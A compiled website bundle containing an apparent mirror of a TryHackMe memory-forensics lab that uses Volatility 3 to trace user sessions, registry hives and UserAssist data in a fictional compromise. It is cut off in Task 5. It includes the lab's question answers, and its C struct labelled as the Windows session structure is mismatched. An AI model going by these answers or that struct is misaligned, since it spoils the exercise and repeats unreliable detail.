"use strict";(self.webpackChunktryhackme_cn=self.webpackChunktryhackme_cn||[]).push([[6937],{2113:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"Modules/Memory Analysis/windowsmemoryanduseractivity","title":"Windows Memory & User Activity","description":"Task 1 Introduction","source":"@site/docs/Modules/Memory Analysis/windowsmemoryanduseractivity.md","sourceDirName":"Modules/Memory Analysis","slug":"/Modules/Memory Analysis/windowsmemoryanduseractivity","permalink":"/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Memory Analysis/windowsmemoryanduseractivity.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"Windows Memory & Processes","permalink":"/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryandprocs"},"next":{"title":"Windows Memory & Network","permalink":"/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryandnetwork"}}');var i=n(4848),r=n(8453);const o={sidebar_position:4},a="Windows Memory & User Activity",c={},d=[{value:"Task 1 Introduction",id:"task-1-introduction",level:2},{value:"Learning Objectives",id:"learning-objectives",level:3},{value:"Prerequisites",id:"prerequisites",level:3},{value:"Task 2 Scenario Information",id:"task-2-scenario-information",level:2},{value:"Scenario",id:"scenario",level:3},{value:"Information Incident THM-0001",id:"information-incident-thm-0001",level:3},{value:"Company Information TryHatMe",id:"company-information-tryhatme",level:3},{value:"Network Map",id:"network-map",level:4},{value:"Task 3 Environment &amp; Setup",id:"task-3-environment--setup",level:2},{value:"Task 4 Tracking Sessions",id:"task-4-tracking-sessions",level:2},{value:"Sessions",id:"sessions",level:3},{value:"Logged Sessions",id:"logged-sessions",level:3},{value:"Find Loaded Registry Hives",id:"find-loaded-registry-hives",level:3},{value:"Graphical Interface Activity",id:"graphical-interface-activity",level:3},{value:"Task 5 Command Execution &amp; File Access",id:"task-5-command-execution--file-access",level:2},{value:"Execution",id:"execution",level:3},{value:"File Access",id:"file-access",level:3},{value:"Task 6 Tracing User Execution",id:"task-6-tracing-user-execution",level:2},{value:"Locating the Template File",id:"locating-the-template-file",level:3},{value:"Confirm Macro Execution",id:"confirm-macro-execution",level:3},{value:"Task 7 Conclusion",id:"task-7-conclusion",level:2}];function l(e){const s={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components},{Details:t}=s;return t||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"windows-memory--user-activity",children:"Windows Memory & User Activity"})}),"\n",(0,i.jsx)(s.h2,{id:"task-1-introduction",children:"Task 1 Introduction"}),"\n",(0,i.jsxs)(s.p,{children:["In this room, we\u2019ll walk through how to investigate user activity from a ",(0,i.jsx)(s.strong,{children:"Windows memory dump"})," using ",(0,i.jsx)(s.strong,{children:"Volatility 3"}),". As analysts, it's important to know what users were doing on a system at the time something suspicious occurred. That includes knowing who was logged in, what commands were executed, and what files were opened, among other activities."]}),"\n",(0,i.jsx)(s.p,{children:"This room is the second in a set of three. We\u2019ll be working with a memory dump from a compromised machine on a small internal network. If the host is indeed compromised, we will need to piece together the scope of the attack and the attack chain."}),"\n",(0,i.jsx)(s.h3,{id:"learning-objectives",children:"Learning Objectives"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Link logins to suspicious activity using session and registry data."}),"\n",(0,i.jsx)(s.li,{children:"Identify commands and file access tied to suspicious access."}),"\n",(0,i.jsx)(s.li,{children:"Reconstruct user actions from memory."}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"prerequisites",children:"Prerequisites"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.a,{href:"https://tryhackme.com/room/volatility",children:"Volatility"})}),"\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.a,{href:"https://tryhackme.com/module/windows-fundamentals",children:"Windows Fundamentals Module"})}),"\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.a,{href:"https://tryhackme.com/room/memoryanalysisintroduction",children:"Memory Analysis Introduction"})}),"\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.a,{href:"https://tryhackme.com/room/windowsmemoryandprocs",children:"Windows Memory & Processes"})}),"\n"]}),"\n",(0,i.jsx)(s.admonition,{title:"Answer the questions below",type:"info",children:(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Click to continue to the room. "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,i.jsx)(s.h2,{id:"task-2-scenario-information",children:"Task 2 Scenario Information"}),"\n",(0,i.jsx)(s.h3,{id:"scenario",children:"Scenario"}),"\n",(0,i.jsx)(s.p,{children:"You are part of the incident response team handling an incident at TryHatMe - a company that exclusively sells hats online. You are tasked with analyzing a full memory dump of a potentially compromised Windows host. Before you, another analyst had already taken a full memory dump and gathered all the necessary information from the TryHatMe IT support team. You are a bit nervous since this is your first case, but don't worry; a senior analyst will guide you."}),"\n",(0,i.jsx)(s.h3,{id:"information-incident-thm-0001",children:"Information Incident THM-0001"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["On May 5th, 2025, at 07:30 CET, TryHatMe initiated its incident response plan and escalated the incident to us. After an initial triage, our team found a Windows host that was potentially compromised. The details of the host are as follows:","\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Hostname: WIN-001"}),"\n",(0,i.jsx)(s.li,{children:"OS: Windows 1022H 10.0.19045"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(s.li,{children:["At 07:45 CET, our analyst Steve Stevenson took a full memory dump of the Windows host and made a hash to ensure its integrity. The memory dump details are:","\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["Name: ",(0,i.jsx)(s.code,{children:"THM-WIN-001_071528_07052025.dmp"})]}),"\n",(0,i.jsxs)(s.li,{children:["MD5-hash: ",(0,i.jsx)(s.code,{children:"78535fc49ab54fed57919255709ae650"})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"company-information-tryhatme",children:"Company Information TryHatMe"}),"\n",(0,i.jsx)(s.h4,{id:"network-map",children:"Network Map"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{alt:"Image showing the current scenario as a network diagram with the DMZ internal, User LAN and Server Lan networks  ",src:n(8514).A+"",width:"5084",height:"3320"})}),"\n",(0,i.jsx)(s.admonition,{title:"Answer the questions below",type:"info",children:(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" I went through the case details and am ready to find out more. "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,i.jsx)(s.h2,{id:"task-3-environment--setup",children:"Task 3 Environment & Setup"}),"\n",(0,i.jsxs)(s.p,{children:["Before moving forward, ",(0,i.jsx)(s.strong,{children:"start the VM"})," by clicking the Start Machine button on the right."]}),"\n",(0,i.jsxs)(s.p,{children:["It will take around 2 minutes to load properly. The VM will be accessible on the right side of the split screen. If the VM is not visible, use the blue ",(0,i.jsx)(s.strong,{children:"Show Split View"})," button at the top of the page."]}),"\n",(0,i.jsxs)(s.p,{children:["We'll continue analyzing the memory dump ",(0,i.jsx)(s.strong,{children:"THM-WIN-001_071528_07052025.mem"})," located in the home directory of the user ",(0,i.jsx)(s.strong,{children:"ubuntu"}),"."]}),"\n",(0,i.jsx)(s.admonition,{title:"Answer the questions below",type:"info",children:(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Click here if you were able to start your environment. "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,i.jsx)(s.h2,{id:"task-4-tracking-sessions",children:"Task 4 Tracking Sessions"}),"\n",(0,i.jsx)(s.p,{children:"In this task, we\u2019re going to look at how to find out who was logged in to the system at the time the memory was captured. This is one of the first steps in any investigation, understanding which user accounts were present and possibly involved in the activity we\u2019re interested in."}),"\n",(0,i.jsx)(s.p,{children:"Windows stores details about sessions, interactive logins, and even application usage in memory."}),"\n",(0,i.jsx)(s.h3,{id:"sessions",children:"Sessions"}),"\n",(0,i.jsx)(s.p,{children:"When investigating a compromised system, it's essential to understand which user accounts were active at the time and what type of access they had. Tracking sessions allows us to see if a user was physically present, connected remotely, or left a session open. This helps narrow down which actions can be attributed to specific users and whether accounts were misused during the attack. Session data can also help differentiate between regular activity and something out of place, such as a session that appears during odd hours, or one coming from an unexpected source/origin."}),"\n",(0,i.jsxs)(s.p,{children:["The voltage plugin inspects memory by locating internal Windows structures (some undocumented) such as ",(0,i.jsx)(s.strong,{children:"_SESSION_MANAGER_INFORMATION"})," and the ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows/win32/devnotes/session",children:"Session Structure"}),". Let's see what the SESSION structure contains:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-c",children:"struct SESSION{\n    ACTION    act;\n    HFILELIST hflist;\n    BOOL      fAllCabinets;\n    BOOL      fOverwrite;\n    BOOL      fNoLineFeed;\n    BOOL      fSelfExtract;\n    long      cbSelfExtractSize;\n    long      cbSelfExtractSize;\n    int       ahfSelf[cMAX_CAB_FILE_OPEN];\n    int       cErrors;\n    HFDI      hfdi;\n    ERF       erf;\n    long      cFiles;\n    long      cbTotalBytes;\n    PERROR    perr;\n    SPILLERR  se;\n    long      cbSpill;\n    char      achSelf[cbFILE_NAME_MAX];\n    char      achMsg[cbMAX_LINE*2];\n    char      achLine;\n    char      achLocation;\n    char      achFile;\n    char      achDest;\n    char      achCabPath;\n    BOOL      fContinuationCabinet;\n    BOOL      fShowReserveInfo;\n    BOOL      fNextCabCalled;\n    CABINET   acab[2];\n    char      achZap[cbFILE_NAME_MAX];\n    char      achCabinetFile[cbFILE_NAME_MAX];\n    int       cArgv;\n    char      **pArgv;\n    int       fDestructive;\n    USHORT    iCurrentFolder;\n    SESSION, *PSESSION;\n}\n"})}),"\n",(0,i.jsxs)(s.p,{children:["The Windows ",(0,i.jsx)(s.strong,{children:"sessions"})," plugin (",(0,i.jsx)(s.strong,{children:"windows.session"}),") walks through these kernel and user session management structures to extract details like session IDs, user SIDs, logon types (e.g., console, RDP), and logon timestamps. These values are stored in the memory of the csrss.exe, winlogon.exe, and other system processes tied to interactive sessions."]}),"\n",(0,i.jsx)(s.h3,{id:"logged-sessions",children:"Logged Sessions"}),"\n",(0,i.jsxs)(s.p,{children:["We can explore the sessions using Volatility. Let's run the command ",(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem windows.sessions > sessions.txt"})," to save the output to a file ",(0,i.jsx)(s.code,{children:"sessions.txt"})," for further analysis."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:"ubuntu@tryhackme$vol -f THM-WIN-001_071528_07052025.mem windows.sessions > sessions.txt\nubuntu@tryhackme$ cat sessions.txt \nVolatility 3 Framework 2.26.0\n\nSession ID  Session Type  Process ID  Process Name        User Name                         Create Time\n----------  ------------- ----------- ------------------- --------------------------------  -------------------------------\nN/A         -             4           System              -                                 2025-05-07 07:08:48.000000 UTC\nN/A         -             92          Registry            -                                 2025-05-07 07:08:44.000000 UTC\nN/A         -             324         smss.exe            -                                 2025-05-07 07:08:48.000000 UTC\n\n[REDACTED]\n1           -             9264        msedge.exe          -                                 2025-05-07 07:09:11.000000 UTC\n1           -             10100       SystemSettings      [redacted]                        2025-05-07 07:09:45.000000 UTC\n1           -             6836        ApplicationFra      [redacted]                        2025-05-07 07:09:45.000000 UTC\n1           -             8408        UserOOBEBroker      [redacted]                        2025-05-07 07:09:45.000000 UTC\n1           -             3276        svchost.exe         [redacted]                        2025-05-07 07:10:51.000000 UTC\n1           -             7376        TextInputHost.      [redacted]                        2025-05-07 07:11:36.000000 UTC\n1           -             7468        dllhost.exe         [redacted]                        2025-05-07 07:11:36.000000 UTC\n1           Console       5952        cmd.exe             [redacted]                        2025-05-07 07:12:43.000000 UTC\n1           Console       3144        conhost.exe         [redacted]                        2025-05-07 07:12:43.000000 UTC\n1           -             828         ShellExperienc      [redacted]                        2025-05-07 07:12:51.000000 UTC\n1           -             3548        RuntimeBroker.      [redacted]                        2025-05-07 07:12:51.000000 UTC\n1           Console       5252        WINWORD.EXE         [redacted]                        2025-05-07 07:13:04.000000 UTC\n1           Console       3392        pdfupdater.exe      [redacted]                        2025-05-07 07:13:05.000000 UTC\n1           Console       3932        ai.exe              [redacted]                        2025-05-07 07:13:05.000000 UTC\n1           Console       2576        conhost.exe         [redacted]                        2025-05-07 07:13:05.000000 UTC\n1           Console       10084       windows-update      [redacted]                        2025-05-07 07:13:05.000000 UTC\n1           Console       10032       updater.exe         [redacted]                        2025-05-07 07:13:56.000000 UTC\n1           Console       432         cmd.exe             [redacted]                        2025-05-07 07:14:36.000000 UTC\n1           Console       4592        conhost.exe         [redacted]                        2025-05-07 07:14:36.000000 UTC\n1           Console       6984        powershell.exe      [redacted]                        2025-05-07 07:14:39.000000 UTC\n1           -             2572        SearchProtocol      [redacted]                        2025-05-07 07:15:23.000000 UTC\n1           -             7788        FTK Imager.exe      [redacted]                        2025-05-07 07:15:28.000000 UTC\n1           Console       9920        dllhost.exe         [redacted]                        2025-05-07 07:15:42.000000 UTC\nN/A         -             1884        MemCompression      -                                 2025-05-07 07:08:49.000000 UTC\n"})}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Note"}),": When running Volatility for the first time, it will take a few minutes for it to start up"]}),"\n",(0,i.jsxs)(s.p,{children:["The operator user session (Session ",(0,i.jsx)(s.strong,{children:"ID 1"}),") stands out due to a clear sequence of suspicious actions. Within seconds, a chain of processes was launched under this user, pointing to active engagement rather than background tasks. The timeline and consistent user context suggest the session was compromised and later used by an attacker."]}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["Suspicious session: Activity tied to user operator with Session ",(0,i.jsx)(s.strong,{children:"ID 1"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:["Malicious process chain: ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"})," \u2192 ",(0,i.jsx)(s.strong,{children:"pdfupdater.exe"})," \u2192 ",(0,i.jsx)(s.strong,{children:"windows-update.exe"})," \u2192 ",(0,i.jsx)(s.strong,{children:"updater.exe"}),"."]}),"\n",(0,i.jsx)(s.li,{children:"All processes were executed under the same interactive session."}),"\n",(0,i.jsxs)(s.li,{children:["Post-exploitation behavior: cmd.exe (",(0,i.jsx)(s.strong,{children:"PID 432"}),") and powershell.exe (",(0,i.jsx)(s.strong,{children:"PID 6984"}),") appeared after ",(0,i.jsx)(s.strong,{children:"updater.exe"}),"."]}),"\n",(0,i.jsx)(s.li,{children:"The attacker likely gained control and began issuing commands."}),"\n",(0,i.jsx)(s.li,{children:"Evidence points to a hijacked user session leveraged after initial access."}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"find-loaded-registry-hives",children:"Find Loaded Registry Hives"}),"\n",(0,i.jsxs)(s.p,{children:["Another important artefact to check is the ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry",children:"Windows Registry"}),", which holds a wide range of user and system configuration data, including details about recently used files, executed programs, wireless connections, and more. When a registry hive (like ",(0,i.jsx)(s.strong,{children:"NTUSER.DAT"})," or ",(0,i.jsx)(s.strong,{children:"SYSTEM"}),") is loaded into memory, it means the user was active and interacting with the system. By identifying which registry hives were present in memory at the time of acquisition, we can tie specific user behavior to particular accounts."]}),"\n",(0,i.jsxs)(s.p,{children:["Volatility locates loaded registry hives by scanning memory for instances of the ",(0,i.jsx)(s.strong,{children:"CMHIVE"})," kernel structure (this structure is undocumented, but we can find some information about it ",(0,i.jsx)(s.a,{href:"https://www.nirsoft.net/kernel_struct/vista/CMHIVE.html",children:"here"}),"). These hives are typically loaded into memory by the Windows kernel during boot or user login. The ",(0,i.jsx)(s.strong,{children:"windows.registry.hivelist"})," plugin walks through the kernel's HiveList. Each entry contains the virtual memory address of the hive and the path where it was originally stored on disk (e.g., ",(0,i.jsx)(s.strong,{children:"C:\\Users\\<USERNAME>\\NTUSER.DAT"}),")."]}),"\n",(0,i.jsxs)(s.p,{children:["Let's use the command ",(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist > hivelist.txt"})," to inspect and save the output to the file hivelist.txt, and analyze the output:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:"ubuntu@tryhackme$ vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist > hivelist.txt\nubuntu@tryhackme$ cat hivelist.txt\nVolatility 3 Framework 2.26.0\n\nOffset              FileFullPath                                                                                                                                            File output\n\n0xbe8c63e66000                                                                                                                                                              Disabled\n0xbe8c63e7d000      \\REGISTRY\\MACHINE\\SYSTEM                                                                                                                                Disabled\n[REDACTED]\n0xbe8c6867b000      \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat                                 Disabled\n0xbe8c6878d000      \\??\\C:\\Users\\operator\\ntuser.dat                                                                                                                        Disabled\n0xbe8c68796000      \\??\\C:\\Users\\operator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat                                                                                      Disabled\n0xbe8c69c6c000      \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve                                                                                                           Disabled\n0xbe8c6a63a000      \\??\\C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\MicrosoftWindows.Client.CBS_1000.19061.1000.0_x64__cw5n1h2txyewy\\ActivationStore.dat        Disabled\n[REDACTED]\n"})}),"\n",(0,i.jsxs)(s.p,{children:["As the output above displays, we can confirm that the registry hive for the user operator was fully loaded into memory at the time the memory dump was taken, including both the main ",(0,i.jsx)(s.strong,{children:"ntuser.dat"})," file and associated user-specific application settings under ",(0,i.jsx)(s.strong,{children:"UsrClass.dat"}),". This strongly indicates that the operator account was not only logged in but also actively interacting with the system, but does not show that any potential interaction occurred."]}),"\n",(0,i.jsxs)(s.p,{children:["Several registry entries from the ",(0,i.jsx)(s.code,{children:"AppData\\Local\\Packages"})," path show traces of modern Windows UWP applications being accessed or configured, such as ",(0,i.jsx)(s.strong,{children:"StartMenuExperienceHost"}),", ",(0,i.jsx)(s.strong,{children:"Search"}),", ",(0,i.jsx)(s.strong,{children:"ShellExperienceHost"}),", and ",(0,i.jsx)(s.strong,{children:"LockApp"}),", all linked to the user ",(0,i.jsx)(s.strong,{children:"operator"}),". The presence of these user hives in memory supports the suspicion raised by the active process tree, especially since this user is connected to the suspicious process involving ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"}),", pdfupdater.exe, and the possible post-exploitation phase."]}),"\n",(0,i.jsx)(s.h3,{id:"graphical-interface-activity",children:"Graphical Interface Activity"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.a,{href:"https://www.magnetforensics.com/blog/artifact-profile-userassist/",children:(0,i.jsx)(s.strong,{children:"UserAssist"})}),", an undocumented registry that tracks executables launched by the user through the graphical interface, helps us understand which programs a user interacted with through the graphical interface. It tracks applications launched from the ",(0,i.jsx)(s.strong,{children:"Start Menu"}),", ",(0,i.jsx)(s.strong,{children:"Desktop"}),", or ",(0,i.jsx)(s.strong,{children:"Explorer"}),", including tools like ",(0,i.jsx)(s.strong,{children:"cmd.exe"}),", ",(0,i.jsx)(s.strong,{children:"powershell.exe"}),", and custom executables. We can use this information to establish what the user actually ran, even if the evidence of execution is gone from the disk or event logs. Seeing something like ",(0,i.jsx)(s.strong,{children:"powershell.exe"})," or ",(0,i.jsx)(s.strong,{children:"regsvr32.exe"})," in ",(0,i.jsx)(s.strong,{children:"UserAssist"})," shortly before a compromise can signal direct user-driven activity, which is critical when trying to determine intent and trace actions to specific accounts. This technique is used in the wild by threat actors like the ",(0,i.jsx)(s.strong,{children:"Raspberry Robin worm"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["The ",(0,i.jsx)(s.strong,{children:"windows.registry.userassist"})," plugin in Volatility reads from the ",(0,i.jsx)(s.strong,{children:"NTUSER.DAT"})," hive, a Windows registry hive file that stores a user's settings and preferences, specifically under the ",(0,i.jsx)(s.strong,{children:"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist"})," key. Each entry is ",(0,i.jsx)(s.strong,{children:"ROT13-encoded"})," and includes details such as the application path, a run counter, and a timestamp of the last time it was launched."]}),"\n",(0,i.jsxs)(s.p,{children:["Let's perform the command ",(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem windows.registry.userassist > userassist.txt"})," and investigate the output by looking at it using ",(0,i.jsx)(s.code,{children:"cat userassist.txt"})]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'TITLE="Terminal"',children:"ubuntu@tryhackme$ cat userassist.txt\nVolatility 3 Framework 2.26.0\n\nHive Offset    Hive Name    Path    Last Write Time    Type    Name    ID    Count    Focus Count    Time Focused    Last Updated    Raw Data\n\n0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}\\Count    2025-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A\n[REDACTED]\n%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Notepad.lnk    N/A    6    0    0:00:00.506000    2025-05-07 06:55:48.000000 UTC    \n00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf ff ff ff ff 50 30 5b 10 ............P0[.\n1d bf db 01 00 00 00 00                         ........        \n* 0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count    2025-05-07 07:15:27.000000 UTC    Value    C:\\Users\\Public\\Desktop\\Google Chrome.lnk    N/A    9    0    0:00:00.509000    2025-05-07 06:58:07.000000 UTC    \n00 00 00 00 09 00 00 00 00 00 00 00 09 00 00 00 ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf ff ff ff ff a0 82 5b 63 ..............[c\n1d bf db 01 00 00 00 00                         ........        \n* 0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count    2025-05-07 07:15:27.000000 UTC    Value    %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Command Prompt.lnk    N/A    33    0    0:00:00.533000    2025-05-07 07:12:43.000000 UTC    \n00 00 00 00 21 00 00 00 00 00 00 00 21 00 00 00 ....!.......!...\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf ff ff ff ff 20 ce 3d 6d ............ .=m\n1f bf db 01 00 00 00 00                         ........        \n* 0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count    2025-05-07 07:15:27.000000 UTC    Value    %APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\File Explorer.lnk    N/A    28    0    0:00:00.528000    2025-05-07 07:11:17.000000 UTC    \n00 00 00 00 1c 00 00 00 00 00 00 00 1c 00 00 00 ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf ff ff ff ff 70 ed 3d 3a ............p.=:\n1f bf db 01 00 00 00 00                         ........        \n* 0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count    2025-05-07 07:15:27.000000 UTC    Value    C:\\Users\\Public\\Desktop\\AccessData FTK Imager.lnk    N/A    6    0    0:00:00.506000    2025-05-07 07:15:27.000000 UTC    \n00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................\n00 00 80 bf 00 00 80 bf ff ff ff ff 20 be be ce ............ ...\n1f bf db 01 00 00 00 00                         ........        \n* 0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count    2025-05-07 07:15:27.000000 UTC    Value    %ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Word.lnk    N/A    0    0    0:00:00.500000    N/A    \n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00 00 00 00 9a 94 ce bf 00 00 00 00 00 00 00 00 ................\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00 00 00 00 25 a2 0b 17                         ....%...        \n0xbe8c6878d000    \\??\\C:\\Users\\operator\\ntuser.dat    ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}\\Count    2025-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A\n"})}),"\n",(0,i.jsxs)(s.p,{children:["As we can observe above, the UserAssist data from the operator user's registry hive reveals execution of key applications that align with our suspected attack chain. Notably, entries referencing ",(0,i.jsx)(s.strong,{children:"Command Prompt.lnk"})," show activity around ",(0,i.jsx)(s.strong,{children:"07:12:43"}),", which directly corresponds with the launch of ",(0,i.jsx)(s.strong,{children:"cmd.exe"})," seen in the session data. This reinforces the idea that the user, or an attacker acting through their session, interacted with the system just before or during the execution of suspicious processes like ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"}),", pdfupdater.exe, and updater.exe. These artifacts help confirm that actions tied to the compromise were launched from an active desktop session, suggesting intentional, user-driven execution."]}),"\n",(0,i.jsx)(s.p,{children:"Great, now that we learned how to get information from sessions, let's move on to the next task."}),"\n",(0,i.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Which plugin should be used to identify user login sessions from memory? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"windows.sessions\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Which user was logged into a console session when WINWORD.EXE and updater.exe were executed? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"DESKTOP-3NMNM0H/operator\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" According to the UserAssist data, which executable related to command-line activity was launched via a shortcut? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"cmd.exe\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Which Volatility 3 plugin reveals evidence of programs launched by a user through the graphical interface? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"windows.registry.userassist\n"})})]})]}),"\n",(0,i.jsx)(s.h2,{id:"task-5-command-execution--file-access",children:"Task 5 Command Execution & File Access"}),"\n",(0,i.jsx)(s.p,{children:"Now that we\u2019ve seen how the possible malicious activity began, it\u2019s time to examine what happened afterwards. We'll look into command execution and identify which files were accessed by any process involved in the attack sequence."}),"\n",(0,i.jsxs)(s.p,{children:["We\u2019ve already established that execution began with ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"})," and led to updater.exe. Our goal now is to determine if any of these components executed commands, interacted with the system through a console, or accessed files that might have been staged or 